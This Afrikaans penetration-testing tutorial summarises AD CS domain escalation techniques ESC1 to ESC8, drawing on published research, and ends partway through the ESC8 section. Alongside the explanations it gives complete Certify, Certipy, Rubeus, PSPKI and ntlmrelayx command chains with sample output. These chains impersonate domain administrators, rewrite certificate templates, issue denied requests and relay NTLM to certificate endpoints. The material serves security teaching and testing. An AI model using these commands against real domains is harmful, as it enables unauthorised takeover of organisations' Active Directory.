# AD CS Domein-escalasie

{{#include ../../../banners/hacktricks-training.md}}


**Dit is 'n opsomming van die eskalasietegniek-afdelings van die plasings:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Verkeerd gekonfigureerde Certificate Templates - ESC1

### Verduideliking

### Verkeerd gekonfigureerde Certificate Templates - ESC1 verduidelik

- **Enrolment-regte word deur die Enterprise CA aan gebruikers met lae bevoorregting toegestaan.**
- **Manager-goedkeuring word nie vereis nie.**
- **Geen handtekeninge van gemagtigde personeel word benodig nie.**
- **Sekuriteitsbeskrywers op Certificate Templates is buitensporig permissief, wat gebruikers met lae bevoorregting toelaat om enrolment-regte te verkry.**
- **Certificate Templates is gekonfigureer om EKUs te definieer wat authentication vergemaklik:**
- Extended Key Usage (EKU)-identifiseerders soos Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), of geen EKU (SubCA) word ingesluit.
- **Die vermoë vir requesters om 'n subjectAltName in die Certificate Signing Request (CSR) in te sluit, word deur die template toegelaat:**
- Die Active Directory (AD) prioritiseer die subjectAltName (SAN) in 'n certificate vir identiteitsverifikasie indien dit teenwoordig is. Dit beteken dat 'n certificate versoek kan word om enige gebruiker (byvoorbeeld 'n domeinadministrateur) te impersonateer deur die SAN in 'n CSR te spesifiseer. Of 'n SAN deur die requester gespesifiseer kan word, word in die certificate template se AD-object deur die `mspki-certificate-name-flag`-eienskap aangedui. Hierdie eienskap is 'n bitmask, en die teenwoordigheid van die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`-flag laat die requester toe om die SAN te spesifiseer.

> [!CAUTION]
> Die konfigurasie wat uiteengesit is, laat gebruikers met lae bevoorregting toe om certificates met enige SAN van hul keuse aan te vra, wat authentication as enige domein-principal deur Kerberos of SChannel moontlik maak.

Hierdie kenmerk word soms geaktiveer om die on-the-fly-generering van HTTPS- of host-certificates deur produkte of deployment services te ondersteun, of weens 'n gebrek aan begrip.

Daar word opgemerk dat die skep van 'n certificate met hierdie opsie 'n waarskuwing aktiveer, wat nie die geval is wanneer 'n bestaande certificate template (soos die `WebServer`-template, wat `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` geaktiveer het) gedupliseer en dan gewysig word om 'n authentication OID in te sluit nie.

### Misbruik

Om **kwesbare certificate templates te vind**, kan jy uitvoer:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Om **hierdie kwesbaarheid te misbruik om 'n administrator na te boots** kan 'n mens die volgende uitvoer:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Dan kan jy die gegenereerde **sertifikaat na `.pfx`-formaat omskakel** en dit gebruik om weer **te authenticate met Rubeus of certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-binaries "Certreq.exe" en "Certutil.exe" kan gebruik word om die PFX te genereer: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die enumerasie van sertifikaatsjablone binne die konfigurasieskema van die AD Forest, spesifiek dié wat nie goedkeuring of handtekeninge vereis nie, oor 'n Client Authentication- of Smart Card Logon-EKU beskik, en waarvan die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`-vlag geaktiveer is, kan uitgevoer word deur die volgende LDAP-navraag te gebruik:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Wankonfigureerde Certificate Templates - ESC2

### Verduideliking

Die tweede misbruikscenario is ’n variasie van die eerste een:

1. Enrollment-regte word deur die Enterprise CA aan gebruikers met lae voorregte toegeken.
2. Die vereiste vir bestuurdergoedkeuring is gedeaktiveer.
3. Die behoefte aan gemagtigde handtekeninge word weggelaat.
4. ’n Oormatig permissiewe security descriptor op die certificate template gee gebruikers met lae voorregte certificate enrollment-regte.
5. **Die certificate template is gedefinieer om die Any Purpose EKU of geen EKU in te sluit.**

Die **Any Purpose EKU** laat ’n aanvaller toe om ’n sertifikaat vir **enige doel** te verkry, insluitend client authentication, server authentication, code signing, ens. Dieselfde **technique wat vir ESC3 gebruik word** kan aangewend word om hierdie scenario uit te buit.

Sertifikate met **geen EKU**, wat as subordinate CA-sertifikate optree, kan vir **enige doel** uitgebuit word en kan **ook gebruik word om nuwe sertifikate te onderteken**. ’n Aanvaller kan dus arbitrêre EKU’s of velde in die nuwe sertifikate spesifiseer deur ’n subordinate CA-sertifikaat te gebruik.

Nuwe sertifikate wat vir **domeinauthentisering** geskep word, sal egter nie funksioneer indien die subordinate CA nie deur die **`NTAuthCertificates`**-objek vertrou word nie, wat die verstekinstelling is. ’n Aanvaller kan nietemin steeds **nuwe sertifikate met enige EKU** en arbitrêre sertifikaatwaardes skep. Dit kan moontlik vir ’n wye reeks doeleindes **misbruik** word (bv. code signing, server authentication, ens.) en kan beduidende implikasies vir ander toepassings in die netwerk hê, soos SAML, AD FS of IPSec.

Om templates te enumerereer wat binne die AD Forest se konfigurasieskema by hierdie scenario pas, kan die volgende LDAP-navraag uitgevoer word:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Verkeerd gekonfigureerde Enrollment Agent Templates - ESC3

### Verduideliking

Hierdie scenario is soortgelyk aan die eerste en tweede een, maar **misbruik** ’n **ander EKU** (Certificate Request Agent) en **2 verskillende templates** (daarom het dit 2 stelle vereistes),

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), wat in Microsoft-dokumentasie as **Enrollment Agent** bekend staan, laat ’n principal toe om vir ’n **sertifikaat** **namens ’n ander gebruiker** in te skryf.

Die **“enrollment agent”** skryf by so ’n **template** in en gebruik die gevolglike **sertifikaat om ’n CSR namens die ander gebruiker mede te onderteken**. Dit stuur dan die **mede-ondertekende CSR** na die CA, en skryf in by ’n **template** wat **“enroll on behalf of”** toelaat. Die CA reageer met ’n **sertifikaat wat aan die “ander” gebruiker behoort**.

**Vereistes 1:**

- Enrollment-regte word deur die Enterprise CA aan gebruikers met lae privilegies toegestaan.
- Die vereiste vir bestuurdergoedkeuring word weggelaat.
- Geen vereiste vir gemagtigde handtekeninge nie.
- Die sekuriteitsbeskrywer van die certificate template is buitensporig permissief en verleen enrollment-regte aan gebruikers met lae privilegies.
- Die certificate template bevat die Certificate Request Agent EKU, wat die versoek van ander certificate templates namens ander principals moontlik maak.

**Vereistes 2:**

- Die Enterprise CA verleen enrollment-regte aan gebruikers met lae privilegies.
- Bestuurdergoedkeuring word omseil.
- Die template se skemawergawe is óf 1 óf hoër as 2, en dit spesifiseer ’n Application Policy Issuance Requirement wat die Certificate Request Agent EKU vereis.
- ’n EKU wat in die certificate template gedefinieer is, laat domeinverifikasie toe.
- Beperkings vir enrollment agents word nie op die CA toegepas nie.

### Misbruik

Jy kan [**Certify**](https://github.com/GhostPack/Certify) of [**Certipy**](https://github.com/ly4k/Certipy) gebruik om hierdie scenario te misbruik:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **users** wat toegelaat word om ’n **enrollment agent certificate** te **obtain**, die templates waarin **agents** toegelaat word om te enroll, en die **accounts** namens wie die enrollment agent mag optree, kan deur enterprise CAs beperk word. Dit word bereik deur die `certsrc.msc` **snap-in** oop te maak, **regsklik op die CA**, **Properties te klik**, en dan na die “Enrollment Agents”-oortjie te **navigeer**.

Daar word egter opgemerk dat die **default**-instelling vir CAs is om “**Do not restrict enrollment agents**” te wees. Wanneer administrators die beperking op enrollment agents aktiveer deur dit op “Restrict enrollment agents” te stel, bly die default-konfigurasie uiters permissief. Dit laat **Everyone** toe om toestemming te verkry om in alle templates as enigiemand te enroll.

## Kwesbare Certificate Template-toegangsbeheer - ESC4

### **Verduideliking**

Die **security descriptor** op **certificate templates** definieer die **permissions** waaroor spesifieke **AD principals** met betrekking tot die template beskik.

Indien ’n **attacker** oor die vereiste **permissions** beskik om ’n **template** te **wysig** en enige **exploitable misconfigurations** wat in **vorige afdelings** uiteengesit is, te **instel**, kan privilege escalation moontlik gemaak word.

Belangrike permissions wat op certificate templates van toepassing is, sluit in:

- **Owner:** Verleen impliciete beheer oor die objek, wat die wysiging van enige attributes moontlik maak.
- **FullControl:** Verleen volledige gesag oor die objek, insluitend die vermoë om enige attributes te wysig.
- **WriteOwner:** Laat die objek se owner toe om verander te word na ’n principal onder die attacker se beheer.
- **WriteDacl:** Laat die access controls toe om aangepas te word, wat ’n attacker moontlik FullControl kan gee.
- **WriteProperty:** Magtig die wysiging van enige object properties.

### Abuse

Om principals met edit-regte op templates en ander PKI-objekte te identifiseer, enumerateer met Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
'n Voorbeeld van 'n privesc soos die vorige een:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is wanneer 'n gebruiker skryfbevoegdhede oor 'n sertifikaatsjabloon het. Dit kan byvoorbeeld misbruik word om die konfigurasie van die sertifikaatsjabloon te oorskryf en die sjabloon kwesbaar vir ESC1 te maak.

Soos ons in die pad hierbo kan sien, het slegs `JOHNPC` hierdie bevoegdhede, maar ons gebruiker `JOHN` het die nuwe `AddKeyCredentialLink`-edge na `JOHNPC`. Aangesien hierdie tegniek met sertifikate verband hou, het ek hierdie aanval ook geïmplementeer, wat bekend staan as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hier is 'n klein voorskou van Certipy se `shadow auto`-opdrag om die slagoffer se NT hash te bekom.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kan die konfigurasie van ’n sertifikaatsjabloon met ’n enkele bevel oorskryf. **By verstek** sal Certipy die konfigurasie **oorskryf om dit kwesbaar vir ESC1 te maak**. Ons kan ook die **`-save-old`-parameter spesifiseer om die ou konfigurasie te stoor**, wat nuttig sal wees om die konfigurasie ná ons aanval te **herstel**.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kwesbare PKI Object Access Control - ESC5

### Verduideliking

Die uitgebreide web van onderling gekoppelde ACL-gebaseerde verhoudings, wat verskeie objekte buiten certificate templates en die certificate authority insluit, kan die sekuriteit van die hele AD CS-stelsel beïnvloed. Hierdie objekte, wat sekuriteit beduidend kan beïnvloed, sluit die volgende in:

- Die AD-rekenaarobjek van die CA-bediener, wat deur meganismes soos S4U2Self of S4U2Proxy gekompromitteer kan word.
- Die RPC/DCOM-bediener van die CA-bediener.
- Enige afstammeling-AD-objek of -container binne die spesifieke containerpad `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Hierdie pad sluit onder meer containers en objekte soos die Certificate Templates-container, Certification Authorities-container, die NTAuthCertificates-objek en die Enrollment Services Container in.

Die sekuriteit van die PKI-stelsel kan gekompromitteer word indien ’n aanvaller met lae voorregte daarin slaag om beheer oor enige van hierdie kritieke komponente te verkry.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Verduideliking

Die onderwerp wat in die [**CQure Academy-plasing**](https://cqureacademy.com/blog/enhanced-key-usage) bespreek word, raak ook die implikasies van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-flag, soos deur Microsoft uiteengesit. Wanneer hierdie konfigurasie op ’n Certification Authority (CA) geaktiveer is, laat dit toe dat **gebruiker-gedefinieerde waardes** by die **subject alternative name** vir **enige versoek** ingesluit word, insluitend versoeke wat uit Active Directory® saamgestel word. Gevolglik laat hierdie voorsiening ’n **indringer** toe om deur **enige template** wat vir domein-**authentication** opgestel is, te enroll—spesifiek templates wat oop is vir enrollment deur **onbevoorregte** gebruikers, soos die standaard User-template. As gevolg hiervan kan ’n sertifikaat verkry word wat die indringer in staat stel om as ’n domeinadministrateur of **enige ander aktiewe entiteit** binne die domein te authenticate.

**Nota**: Die metode om **alternative names** by ’n Certificate Signing Request (CSR) te voeg deur die `-attrib "SAN:"`-argument in `certreq.exe` (waarna as “Name Value Pairs” verwys word), verskil van die uitbuitingstrategie vir SANs in ESC1. Die onderskeid lê hier in **hoe rekeninginligting ingekapsuleer word**—binne ’n certificate attribute eerder as ’n extension.

### Misbruik

Om te verifieer of die instelling geaktiveer is, kan organisasies die volgende opdrag met `certutil.exe` gebruik:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Hierdie bewerking maak in wese gebruik van **remote registry access**, dus kan ’n alternatiewe benadering wees:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools soos [**Certify**](https://github.com/GhostPack/Certify) en [**Certipy**](https://github.com/ly4k/Certipy) is in staat om hierdie wanopstelling op te spoor en dit uit te buit:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Om hierdie instellings te wysig, met die veronderstelling dat ’n mens **domeinadministratiewe** regte of ekwivalente regte het, kan die volgende opdrag vanaf enige werkstasie uitgevoer word:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Om hierdie konfigurasie in jou omgewing te deaktiveer, kan die vlag verwyder word met:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Ná die sekuriteitsopdaterings van Mei 2022 sal nuut uitgereikte **sertifikate** ’n **sekuriteitsuitbreiding** bevat wat die **versoeker se `objectSid`-eienskap** insluit. Vir ESC1 word hierdie SID van die gespesifiseerde SAN afgelei. Vir **ESC6** weerspieël die SID egter die **versoeker se `objectSid`**, nie die SAN nie.\
> Om ESC6 te ontgin, moet die stelsel vatbaar wees vir ESC10 (Weak Certificate Mappings), wat voorkeur gee aan die **SAN bo die nuwe sekuriteitsuitbreiding**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Toegangsbeheer vir ’n sertifikaatowerheid word deur ’n stel toestemmings gehandhaaf wat CA-handelinge beheer. Hierdie toestemmings kan besigtig word deur `certsrv.msc` oop te maak, met die regtermuisknop op ’n CA te klik, properties te kies en dan na die Security-oortjie te navigeer. Toestemmings kan ook met die PSPKI-module geïnventariseer word deur opdragte soos die volgende te gebruik:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dit bied insig in die primêre regte, naamlik **`ManageCA`** en **`ManageCertificates`**, wat onderskeidelik ooreenstem met die rolle “CA-administrateur” en “Certificate Manager”.

#### Misbruik

Die besit van **`ManageCA`**-regte op ’n certificate authority stel die principal in staat om instellings op afstand met PSPKI te manipuleer. Dit sluit in die aanskakeling van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-vlag om SAN-spesifikasie in enige template toe te laat, ’n kritieke aspek van domain escalation.

Hierdie proses kan vereenvoudig word deur PSPKI se **Enable-PolicyModuleFlag**-cmdlet te gebruik, wat wysigings moontlik maak sonder direkte GUI-interaksie.

Die besit van **`ManageCertificates`**-regte vergemaklik die goedkeuring van hangende versoeke, waardeur die “CA certificate manager approval”-beveiliging effektief omseil word.

’n Kombinasie van die **Certify**- en **PSPKI**-modules kan gebruik word om ’n sertifikaat aan te vra, goed te keur en af te laai:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Aanval 2

#### Verduideliking

> [!WARNING]
> In die **vorige aanval** is **`Manage CA`**-toestemmings gebruik om die **EDITF_ATTRIBUTESUBJECTALTNAME2**-vlag te **aktiveer** om die **ESC6-aanval** uit te voer, maar dit sal geen effek hê voordat die CA-diens (`CertSvc`) herbegin word nie. Wanneer 'n gebruiker die `Manage CA`-toegangsreg het, word die gebruiker ook toegelaat om die **diens te herbegin**. Dit beteken egter **nie dat die gebruiker die diens op afstand kan herbegin nie**. Verder sal E**SC6 moontlik nie onmiddellik werk nie** in die meeste omgewings wat gelap is, weens die sekuriteitsopdaterings van Mei 2022.

Daarom word nog 'n aanval hier aangebied.

Voorvereistes:

- Slegs **`ManageCA`-toestemming**
- **`Manage Certificates`**-toestemming (kan vanaf **`ManageCA`** toegestaan word)
- Sertifikaatsjabloon **`SubCA`** moet **geaktiveer** wees (kan vanaf **`ManageCA`** geaktiveer word)

Die tegniek maak staat op die feit dat gebruikers met die `Manage CA` _en_ `Manage Certificates`-toegangsreg **mislukte sertifikaatversoeke kan uitreik**. Die **`SubCA`**-sertifikaatsjabloon is **kwesbaar vir ESC1**, maar **slegs administrateurs** kan by die sjabloon inskryf. Dus kan 'n **gebruiker** **versoek** om by die **`SubCA`** in te skryf - wat **geweier** sal word - maar **daarna deur die bestuurder uitgereik word**.

#### Misbruik

Jy kan die **`Manage Certificates`**-toegangsreg aan jouself **toestaan** deur jou gebruiker as 'n nuwe beampte by te voeg.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`**-sjabloon kan **op die CA geaktiveer word** met die `-enable-template`-parameter. By verstek is die `SubCA`-sjabloon geaktiveer.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Indien ons aan die voorvereistes vir hierdie aanval voldoen het, kan ons begin deur **'n sertifikaat gebaseer op die `SubCA`-sjabloon aan te vra**.

**Hierdie versoek sal geweie**r word, maar ons sal die private sleutel stoor en die versoek-ID aanteken.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Met ons **`Manage CA` en `Manage Certificates`** kan ons dan die mislukte sertifikaatversoek met die `ca`-opdrag en die `-issue-request <request ID>`-parameter uitreik.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
En laastens kan ons die **uitgereikte sertifikaat** met die `req`-opdrag en die `-retrieve <request ID>`-parameter **ophaal**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Aanval 3 – Misbruik van Manage Certificates-uitbreiding (SetExtension)

#### Verduideliking

Benewens die klassieke ESC7-misbruike (die aktivering van EDITF-attribute of die goedkeuring van hangende versoeke), het **Certify 2.0** ’n splinternuwe primitief onthul wat slegs die *Manage Certificates* (ook bekend as die **Certificate Manager / Officer**)-rol op die Enterprise CA vereis.

Die `ICertAdmin::SetExtension` RPC-metode kan uitgevoer word deur enige principal wat *Manage Certificates* besit. Hoewel die metode tradisioneel deur wettige CAs gebruik is om uitbreidings op **hangende** versoeke by te werk, kan ’n aanvaller dit misbruik om ’n ***non-default* certificate extension** (byvoorbeeld ’n pasgemaakte *Certificate Issuance Policy* OID soos `1.1.1.1`) by ’n versoek wat op goedkeuring wag, te voeg.

Omdat die geteikende template nie ’n verstekwaarde vir daardie uitbreiding definieer nie, sal die CA nie die aanvaller-beheerde waarde oorskryf wanneer die versoek uiteindelik uitgereik word nie. Die gevolglike sertifikaat bevat dus ’n uitbreiding wat deur die aanvaller gekies is en wat moontlik:

* Aan Application / Issuance Policy-vereistes van ander kwesbare templates voldoen (wat tot privilege escalation lei).
* Bykomende EKUs of policies invoeg wat die sertifikaat onverwagte vertroue in third-party systems gee.

Kortliks kan *Manage Certificates* – wat voorheen as die “minder kragtige” helfte van ESC7 beskou is – nou vir volledige privilege escalation of langtermyn-persistence gebruik word, sonder om aan CA-konfigurasie te raak of die meer beperkende *Manage CA*-reg te vereis.

#### Misbruik van die primitief met Certify 2.0

1. **Dien ’n sertifikaatversoek in wat *pending* sal bly.**  Dit kan gedwing word met ’n template wat manager approval vereis:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Voeg ’n pasgemaakte uitbreiding by die hangende versoek** met die nuwe `manage-ca`-command:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*As die template nie reeds die *Certificate Issuance Policies*-uitbreiding definieer nie, sal die waarde hierbo ná uitreiking behoue bly.*

3. **Reik die versoek uit** (indien jou rol ook *Manage Certificates*-goedkeuringsregte het) of wag vir ’n operateur om dit goed te keur. Sodra dit uitgereik is, laai die sertifikaat af:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Die gevolglike sertifikaat bevat nou die malicious issuance-policy OID en kan in daaropvolgende attacks gebruik word (bv. ESC13, domain escalation, ens.).

> LET WEL:  Dieselfde aanval kan met Certipy ≥ 4.7 deur die `ca`-command en die `-set-extension`-parameter uitgevoer word.

## NTLM Relay na AD CS HTTP Endpoints – ESC8

### Verduideliking

> [!TIP]
> In omgewings waar **AD CS geïnstalleer is**, indien ’n **web enrollment endpoint wat kwesbaar is** bestaan en ten minste een **certificate template gepubliseer is** wat **domain computer enrollment en client authentication** toelaat (soos die verstek **`Machine`**-template), word dit moontlik vir **enige rekenaar met die spooler service aktief om deur ’n aanvaller gekompromitteer te word**!

Verskeie **HTTP-based enrollment methods** word deur AD CS ondersteun en is beskikbaar deur addisionele server roles wat administrateurs kan installeer. Hierdie interfaces vir HTTP-based certificate enrollment is vatbaar vir **NTLM relay attacks**. ’n Aanvaller kan vanaf ’n **gekompromitteerde masjien enige AD-account naboots wat via inbound NTLM authenticate**. Terwyl die slagofferaccount nageboots word, kan ’n aanvaller toegang tot hierdie webinterfaces verkry om ’n client authentication certificate met die `User`- of `Machine`-certificate templates aan te vra.

- Die **web enrollment interface** (’n ouer ASP-application beskikbaar by `http://<caserver>/certsrv/`) gebruik by verstek slegs HTTP, wat geen beskerming teen NTLM relay attacks bied nie. Daarbenewens laat dit uitdruklik slegs NTLM-authentication deur sy Authorization HTTP-header toe, wat veiliger authentication methods soos Kerberos ontoepaslik maak.
- Die **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service en **Network Device Enrollment Service** (NDES) ondersteun by verstek negotiate authentication deur hul Authorization HTTP-header. Negotiate authentication **ondersteun beide** Kerberos en **NTLM**, wat ’n aanvaller toelaat om authentication tydens relay attacks na **NTLM** af te gradeer. Hoewel hierdie webservices HTTPS by verstek aktiveer, bied HTTPS alleen **geen beskerming teen NTLM relay attacks nie**. Beskerming teen NTLM relay attacks vir HTTPS-services is slegs moontlik wanneer HTTPS met channel binding gekombineer word. Ongelukkig aktiveer AD CS nie Extended Protection for Authentication op IIS nie, wat vir channel binding vereis word.

’n Algemene **probleem** met NTLM relay attacks is die **kort duur van NTLM-sessies** en die onvermoë van die aanvaller om met services te kommunikeer wat **NTLM signing vereis**.

Nietemin word hierdie beperking oorkom deur ’n NTLM relay attack te misbruik om ’n sertifikaat vir die gebruiker te bekom, aangesien die sertifikaat se geldigheidstydperk die sessie se duur bepaal en die sertifikaat gebruik kan word met services wat **NTLM signing afdwing**. Vir instruksies oor die gebruik van ’n gesteelde sertifikaat, verwys na:


{{#ref}}
account-persistence.md
{{#endref}}

Nog ’n beperking van NTLM relay attacks is dat **’n aanvaller-beheerde masjien deur ’n slagofferaccount geauthenticate moet word**. Die aanvaller kan óf wag óf probeer om hierdie authentication te **force**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Misbruik**

[**Certify**](https://github.com/GhostPack/Certify) se `cas` lys **geaktiveerde HTTP AD CS-endpoints** op:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die `msPKI-Enrollment-Servers`-eienskap word deur enterprise Certificate Authorities (CAs) gebruik om Certificate Enrollment Service (CES)-eindpunte te stoor. Hierdie eindpunte kan ontleed en gelys word deur die **Certutil.exe**-tool te gebruik:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Misbruik met Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Misbruik met [Certipy](https://github.com/ly4k/Certipy)

Die sertifikaataanvraag word by verstek deur Certipy gebaseer op die template `Machine` of `User`, bepaal deur of die rekeningnaam wat gerelay word op `$` eindig. ’n Alternatiewe template kan deur die gebruik van die `-template`-parameter gespesifiseer word.

